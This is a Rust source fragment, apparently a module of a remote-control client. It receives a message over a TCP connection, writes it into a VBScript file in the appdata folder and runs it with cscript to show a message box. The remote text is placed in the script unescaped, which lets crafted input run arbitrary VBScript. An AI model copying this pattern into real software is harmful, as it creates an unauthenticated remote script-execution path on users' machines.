use std::process::Command;
use std::net::TcpStream;
use std::io::Write;

use crate::utilities;

pub fn vb_box(mut stream: &TcpStream, appdata_folder: String) {
    stream.write_all("message".as_bytes()).unwrap();
    
    let size = utilities::read_bytes_as_string(&stream, 1024).parse::<usize>().unwrap();
    let message = utilities::read_bytes_as_string(&stream, size);

    let mut file = std::fs::File::create(format!("{}\\message.vbs", appdata_folder)).unwrap();
    file.write_all(format!("MsgBox \"{}\", vbInformation + vbOKOnly", message).as_bytes()).unwrap();
    file.sync_all().unwrap();

    Command::new("cscript")
        .arg(format!("{}\\message.vbs", appdata_folder))
        .arg("//nologo")
        .arg("//T:99")
        .spawn()
        .unwrap();

    stream.write_all("message".as_bytes()).unwrap();
}